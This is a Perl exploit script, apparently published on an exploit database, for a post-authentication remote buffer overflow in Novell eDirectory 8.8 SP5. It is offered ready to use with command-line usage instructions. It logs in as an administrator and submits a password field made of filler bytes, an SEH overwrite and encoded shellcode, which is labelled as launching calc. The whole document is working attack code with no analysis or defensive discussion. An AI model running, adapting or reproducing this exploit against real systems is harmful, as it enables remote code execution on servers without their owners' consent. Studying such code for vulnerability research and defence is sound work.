# Exploit Title: Novell eDirectory 8.8 SP5 (Post Auth) Remote BOF Exploit (0day)
# Date: 06/01/2010
# Author: His0k4 & Simo36
# Version: 8.8 SP5
# Tested on: Windows xp sp3
# Code :
#!usr\bin\perl

use WWW::Mechanize;
use HTTP::Cookies;
use HTTP::Headers;

$target=$ARGV[0];

if(!$ARGV[0]){

print "[+] Novell eDirectory 8.8 SP5 (Post Auth) Remote BOF (0day)\n";
print "[+] Exploit : His0k4 & Simo36\n";
print "Usage:perl $0 [target]\n";
print "Example : exploit.pl<http://exploit.pl> https://192.168.1.2:8030\n";
exit();
}


$login_url = "$target/_LOGIN_SERVER_";

$url = "$target/dhost/httpstk";

# calc shellcode
my $shellcode =
"PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJItiO9mSHi".
"YNjyzNYIRTetxtQKOqpsgcHUKIin24OsjKkL9r8tWYVqNZWdXUL9T5PQhid2".
"NbvqlmKH21MOLZyqT5PKXujXVuQM1NhMpuTUukYXunNmpy3MUnSPjrP8FTWi".
"n4wKTUKPjNnMxZb0MpGl2U2kxqzXFu2RSn8uLuMONjHekOYoSnxeCEvuWNpp".
"LbDpXQwJJoJtNQ1bONWT2pfYK64XCnLykBMOY5m5scooOMxq4UwmqNBY0Nb4".
"yEIirUQlkYMvhOXbLuNOrWJLpVVYou3toMlGwVhvnFnqSVIzCoygMyJKdroj".
"mOBXx6Xyinr4eZA";

my $junk = "\x41" x 468;
my $jmp = "\x75\x06\x41\x42";
my $seh = "Du0d"; #Univ ret
my $align = "\x61" x 3;
my $eax = "\x50\xC3";
my $data1 = "\x43" x 146;
my $data2 = "\x43" x 900;

my $payload = $junk.$jmp.$seh.$align.$eax.$data1.$shellcode.$data2;

########Change Admin info########

$username = "Admin.context";

$password = "passwd";

#########################################

my $mechanize = WWW::Mechanize->new();
$mechanize->cookie_jar(HTTP::Cookies->new(file => "$cookie_file",autosave => 1));
$mechanize->timeout($url_timeout);

#Login
print "[x] Sending User & pass...\n";
$res = $mechanize->request(HTTP::Request->new('GET', "$login_url"));

$mechanize->submit_form(

form_name => "authenticator",

fields => {

usr => $username,
pwd => $password},

button => 'Login');

#vuln occurring
print "[x] Sending Exploit...\n";
$res = $mechanize->get("$url");
print "[x] Exploit Sent!\n";
$mechanize->submit_form(

fields => {

sadminpwd => $payload,
verifypwd => $payload}
);